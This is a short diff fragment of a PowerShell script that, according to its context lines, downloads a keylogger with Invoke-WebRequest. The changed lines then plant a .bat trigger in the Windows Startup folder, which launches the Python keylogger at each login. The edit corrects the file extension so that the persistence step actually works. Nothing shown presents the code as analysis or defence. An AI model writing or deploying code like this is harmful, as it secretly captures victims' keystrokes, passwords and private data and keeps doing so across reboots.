@@ -62,9 +62,9 @@ Invoke-WebRequest -Uri $sourceKeyLogger -OutFile $destination4keylogger;
 
 # Creating trigger file on startup for keylogger
 
-New-Item "C:\Users\oleg_\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.txt";
+New-Item "C:\Users\oleg_\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat";
 
-Set-Content "C:\Users\oleg_\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.cmd" 'start powershell "$user = [System.Environment]::UserName; powershell -c C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\keyloggerscript.py" ';
+Set-Content "C:\Users\oleg_\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\trigger.bat" 'start powershell "$user = [System.Environment]::UserName; powershell -c C:\Users\$user\Downloads\test\python.exe C:\Users\$user\Downloads\keyloggerscript.py" ';
 
 
 # Running keylogger script
